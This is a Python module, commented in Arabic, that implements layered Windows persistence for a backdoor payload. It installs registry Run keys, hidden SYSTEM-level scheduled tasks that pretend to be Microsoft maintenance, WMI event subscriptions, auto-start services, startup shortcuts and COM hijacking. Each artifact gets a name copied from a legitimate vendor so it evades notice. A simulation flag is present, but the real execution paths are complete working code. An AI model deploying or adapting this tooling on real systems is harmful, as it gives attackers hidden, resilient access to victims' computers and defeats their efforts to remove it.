"""
Windows Persistence - طرق استمرارية متعددة لأنظمة Windows
يزرع backdoors في أماكن مختلفة لاكتشاف صعب
"""

import os
import sys
import json
import random
import string
import hashlib
import logging
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum
import subprocess

logger = logging.getLogger(__name__)


class PersistenceMethod(Enum):
    """طرق الاستمرارية المدعومة"""
    REGISTRY_RUN = "registry_run"
    SCHEDULED_TASK = "scheduled_task"
    WMI_EVENT = "wmi_event_subscription"
    SERVICE = "service"
    STARTUP_FOLDER = "startup_folder"
    WINLOGON = "winlogon_notify"
    COM_HIJACKING = "com_hijacking"
    IMAGE_FILE_EXECUTION = "image_file_execution_options"
    BOOTKIT = "bootkit"
    DLL_HIJACKING = "dll_hijacking"
    COR_PROFILER = "cor_profiler"


@dataclass
class PersistenceArtifact:
    """أثر استمرارية"""
    method: PersistenceMethod
    name: str
    path: str
    installed_at: float
    active: bool = True
    detection_risk: str = "medium"  # low, medium, high
    removal_difficulty: str = "medium"


class WindowsPersistence:
    """
    مدير استمرارية Windows - يزرع backdoors متعددة الطبقات
    
    كل طريقة تعمل بشكل مستقل، لو اكتُشفت واحدة تبقى الأخرى
    """
    
    def __init__(self, simulation_mode: bool = True):
        self.simulation_mode = simulation_mode
        self.installed_artifacts: List[PersistenceArtifact] = []
        
        # إعدادات التخفي
        self.hide_from_user = True
        self.use_legitimate_names = True
        
        logger.info(f"WindowsPersistence initialized (simulation={simulation_mode})")
    
    def _generate_random_name(self, prefix: str = "") -> str:
        """توليد اسم عشوائي يبدو شرعياً"""
        legitimate_names = [
            "WindowsUpdate", "SecurityHealth", "OneDriveSync", "EdgeUpdate",
            "ChromeUpdater", "AdobeGCInvoker", "MicrosoftEdge", "TeamsUpdate",
            "OfficeClickToRun", "WindowsDefender", "IntelDriverUpdate",
            "NvidiaContainer", "RealtekAudio", "JavaUpdateScheduler",
        ]
        
        if self.use_legitimate_names:
            base = random.choice(legitimate_names)
            suffix = ''.join(random.choices(string.digits, k=2))
            return f"{base}{suffix}"
        else:
            return f"{prefix}_{hashlib.md5(os.urandom(8)).hexdigest()[:8]}"
    
    def install_registry_run(self, payload_path: str, run_key: str = "HKCU") -> PersistenceArtifact:
        """
        الاستمرارية عبر Registry Run Key
        HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        HKLM\Software\Microsoft\Windows\CurrentVersion\Run
        """
        name = self._generate_random_name("Run")
        
        if run_key.upper() == "HKCU":
            reg_path = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        else:
            reg_path = "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        command = f'reg add "{reg_path}" /v "{name}" /t REG_SZ /d "{payload_path}" /f'
        
        if self.simulation_mode:
            logger.info(f"[SIM] Registry Run persistence: {name} -> {payload_path}")
        else:
            try:
                subprocess.run(command, shell=True, capture_output=True, check=True)
                logger.info(f"Installed Registry Run: {name}")
            except Exception as e:
                logger.error(f"Failed to install Registry Run: {e}")
                raise
        
        artifact = PersistenceArtifact(
            method=PersistenceMethod.REGISTRY_RUN,
            name=name,
            path=reg_path,
            installed_at=__import__('time').time(),
            detection_risk="low",
            removal_difficulty="easy",
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_scheduled_task(self, payload_path: str, trigger_type: str = "logon") -> PersistenceArtifact:
        """
        الاستمرارية عبر Scheduled Task
        trigger_type: logon, startup, daily, hourly
        """
        name = self._generate_random_name("Task")
        
        if trigger_type == "logon":
            trigger = "OnLogon"
        elif trigger_type == "startup":
            trigger = "OnStartup"
        elif trigger_type == "daily":
            trigger = "Daily"
        else:
            trigger = "OnLogon"
        
        # إنشاء مهمة مجدولة تخفي نفسها
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Windows System Maintenance</Description>
  </RegistrationInfo>
  <Triggers>
    <{trigger}Trigger>
      <Enabled>true</Enabled>
    </{trigger}Trigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>S-1-5-18</UserId>
    </Principal>
  </Principals>
  <Settings>
    <Hidden>true</Hidden>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
  </Settings>
  <Actions>
    <Exec>
      <Command>{payload_path}</Command>
    </Exec>
  </Actions>
</Task>'''
        
        if self.simulation_mode:
            logger.info(f"[SIM] Scheduled Task: {name} ({trigger_type})")
        else:
            try:
                # حفظ XML مؤقت
                import tempfile
                with tempfile.NamedTemporaryFile(mode='w', suffix='.xml', delete=False) as f:
                    f.write(xml_template)
                    xml_path = f.name
                
                subprocess.run(
                    f'schtasks /create /tn "{name}" /xml "{xml_path}" /f',
                    shell=True, capture_output=True, check=True
                )
                os.unlink(xml_path)
                logger.info(f"Installed Scheduled Task: {name}")
            except Exception as e:
                logger.error(f"Failed to install Scheduled Task: {e}")
        
        artifact = PersistenceArtifact(
            method=PersistenceMethod.SCHEDULED_TASK,
            name=name,
            path=f"Task Scheduler\\{name}",
            installed_at=__import__('time').time(),
            detection_risk="medium",
            removal_difficulty="medium",
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_wmi_event(self, payload_path: str, event_filter: str = "startup") -> PersistenceArtifact:
        """
        الاستمرارية عبر WMI Event Subscription (مقاومة للكشف)
        """
        filter_name = self._generate_random_name("Filter")
        consumer_name = self._generate_random_name("Consumer")
        binding_name = self._generate_random_name("Binding")
        
        # WMI Query for startup event
        query = "SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='explorer.exe'"
        
        wmi_script = f'''
$filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments @{{
    Name = "{filter_name}";
    EventNameSpace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "{query}"
}}
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments @{{
    Name = "{consumer_name}";
    ExecutablePath = "{payload_path}";
    CommandLineTemplate = "{payload_path}"
}}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{{
    Filter = $filter;
    Consumer = $consumer
}}
'''
        
        if self.simulation_mode:
            logger.info(f"[SIM] WMI Event Subscription: {filter_name}")
        else:
            try:
                subprocess.run(
                    ['powershell', '-Command', wmi_script],
                    capture_output=True, check=True
                )
                logger.info(f"Installed WMI Event Subscription")
            except Exception as e:
                logger.error(f"Failed to install WMI Event: {e}")
        
        artifact = PersistenceArtifact(
            method=PersistenceMethod.WMI_EVENT,
            name=filter_name,
            path="WMI Subscription",
            installed_at=__import__('time').time(),
            detection_risk="high",  # WMI يصعب اكتشافه
            removal_difficulty="hard",
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_service(self, payload_path: str, service_type: str = "own_process") -> PersistenceArtifact:
        """
        الاستمرارية عبر Windows Service
        """
        name = self._generate_random_name("Service")
        display_name = f"{name} Helper Service"
        
        service_script = f'''
sc create "{name}" binPath= "{payload_path}" start= auto
sc description "{name}" "Provides support for Windows system components"
sc config "{name}" obj= "LocalSystem"
'''
        
        if self.simulation_mode:
            logger.info(f"[SIM] Service: {name}")
        else:
            try:
                subprocess.run(service_script, shell=True, capture_output=True, check=True)
                logger.info(f"Installed Service: {name}")
            except Exception as e:
                logger.error(f"Failed to install Service: {e}")
        
        artifact = PersistenceArtifact(
            method=PersistenceMethod.SERVICE,
            name=name,
            path="Services",
            installed_at=__import__('time').time(),
            detection_risk="medium",
            removal_difficulty="medium",
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_startup_folder(self, payload_path: str, user_level: str = "current") -> PersistenceArtifact:
        """
        الاستمرارية عبر مجلد Startup
        """
        if user_level == "current":
            startup_path = os.path.join(
                os.environ.get('APPDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'
            )
        else:
            startup_path = os.path.join(
                os.environ.get('PROGRAMDATA', ''),
                'Microsoft', 'Windows', 'Start Menu', 'Programs', 'StartUp'
            )
        
        link_name = self._generate_random_name() + ".lnk"
        shortcut_path = os.path.join(startup_path, link_name)
        
        if self.simulation_mode:
            logger.info(f"[SIM] Startup folder: {shortcut_path}")
        else:
            try:
                # إنشاء اختصار باستخدام PowerShell
                ps_script = f'''
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{shortcut_path}")
$Shortcut.TargetPath = "{payload_path}"
$Shortcut.Save()
'''
                subprocess.run(['powershell', '-Command', ps_script], capture_output=True, check=True)
                logger.info(f"Installed Startup shortcut: {link_name}")
            except Exception as e:
                logger.error(f"Failed to install Startup shortcut: {e}")
        
        artifact = PersistenceArtifact(
            method=PersistenceMethod.STARTUP_FOLDER,
            name=link_name,
            path=startup_path,
            installed_at=__import__('time').time(),
            detection_risk="low",
            removal_difficulty="easy",
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_com_hijacking(self, clsid: str = None, payload_dll: str = None) -> PersistenceArtifact:
        """
        COM Hijacking - استغلال مفاتيح التسجيل لـ COM لتشغيل DLL
        """
        if clsid is None:
            # استخدام CLSID شائع لنظام Windows
            clsid = "{BCDE0395-E52F-467C-8E3D-C4579291692E}"
        
        if payload_dll is None:
            payload_dll = r"C:\Windows\System32\evil.dll"
        
        reg_path = f"HKCR\\CLSID\\{clsid}\\InprocServer32"
        
        if self.simulation_mode:
            logger.info(f"[SIM] COM Hijacking: {clsid} -> {payload_dll}")
        else:
            try:
                subprocess.run(
                    f'reg add "{reg_path}" /ve /t REG_SZ /d "{payload_dll}" /f',
                    shell=True, capture_output=True, check=True
                )
                logger.info(f"Installed COM Hijacking for {clsid}")
            except Exception as e:
                logger.error(f"Failed to install COM Hijacking: {e}")
        
        artifact = PersistenceArtifact(
            method=PersistenceMethod.COM_HIJACKING,
            name=clsid,
            path=reg_path,
            installed_at=__import__('time').time(),
            detection_risk="high",
            removal_difficulty="hard",
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def install_bootkit(self, payload_bin: str) -> PersistenceArtifact:
        """
        Bootkit - استمرارية على مستوى الـ boot (صعبة الاكتشاف)
        (محاكاة فقط - تنفيذ حقيقي يتطلب مهارات متقدمة)
        """
        if self.simulation_mode:
            logger.warning("[SIM] Bootkit installation (simulated only)")
        else:
            logger.warning("Bootkit installation requires kernel-level access - not implemented in simulation")
        
        artifact = PersistenceArtifact(
            method=PersistenceMethod.BOOTKIT,
            name="Bootkit",
            path="MBR/UEFI",
            installed_at=__import__('time').time(),
            detection_risk="critical",
            removal_difficulty="extreme",
        )
        self.installed_artifacts.append(artifact)
        return artifact
    
    def deploy_full_persistence(self, payload_path: str) -> List[PersistenceArtifact]:
        """
        نشر جميع طبقات الاستمرارية
        """
        artifacts = []
        
        # طبقة 1: Registry Run
        artifacts.append(self.install_registry_run(payload_path, "HKCU"))
        
        # طبقة 2: Scheduled Task
        artifacts.append(self.install_scheduled_task(payload_path, "logon"))
        
        # طبقة 3: WMI Event
        artifacts.append(self.install_wmi_event(payload_path))
        
        # طبقة 4: Service
        artifacts.append(self.install_service(payload_path))
        
        # طبقة 5: Startup Folder
        artifacts.append(self.install_startup_folder(payload_path))
        
        # طبقة 6: COM Hijacking (اختياري)
        # artifacts.append(self.install_com_hijacking())
        
        logger.info(f"Deployed {len(artifacts)} persistence layers")
        return artifacts
    
    def remove_all(self):
        """إزالة جميع آثار الاستمرارية"""
        for artifact in self.installed_artifacts:
            if artifact.method == PersistenceMethod.REGISTRY_RUN:
                # حذف مفتاح التسجيل
                if not self.simulation_mode:
                    subprocess.run(f'reg delete "{artifact.path}" /v "{artifact.name}" /f', shell=True)
            elif artifact.method == PersistenceMethod.SCHEDULED_TASK:
                if not self.simulation_mode:
                    subprocess.run(f'schtasks /delete /tn "{artifact.name}" /f', shell=True)
            elif artifact.method == PersistenceMethod.WMI_EVENT:
                if not self.simulation_mode:
                    # حذف WMI subscription
                    wmi_cleanup = f'''
Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object {{$_.Name -eq "{artifact.name}"}} | Remove-WmiObject
Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object {{$_.Name -eq "{artifact.name}"}} | Remove-WmiObject
'''
                    subprocess.run(['powershell', '-Command', wmi_cleanup], capture_output=True)
            elif artifact.method == PersistenceMethod.SERVICE:
                if not self.simulation_mode:
                    subprocess.run(f'sc stop "{artifact.name}"', shell=True)
                    subprocess.run(f'sc delete "{artifact.name}"', shell=True)
        
        self.installed_artifacts.clear()
        logger.info("All persistence artifacts removed")
    
    def get_status(self) -> Dict:
        """الحصول على حالة الاستمرارية"""
        return {
            "total_artifacts": len(self.installed_artifacts),
            "artifacts": [
                {
                    "method": a.method.value,
                    "name": a.name,
                    "active": a.active,
                    "detection_risk": a.detection_risk,
                }
                for a in self.installed_artifacts
            ]
        }


# مثال الاستخدام
if __name__ == "__main__":
    persistence = WindowsPersistence(simulation_mode=True)
    
    print("\n" + "="*60)
    print("Windows Persistence Deployment")
    print("="*60)
    
    artifacts = persistence.deploy_full_persistence("C:\\Windows\\Temp\\backdoor.exe")
    
    for art in artifacts:
        print(f"  - {art.method.value}: {art.name} (risk: {art.detection_risk})")
    
    print(f"\nStatus: {persistence.get_status()}")
    
    # إزالة الكل
    persistence.remove_all()
    print("All persistence removed.")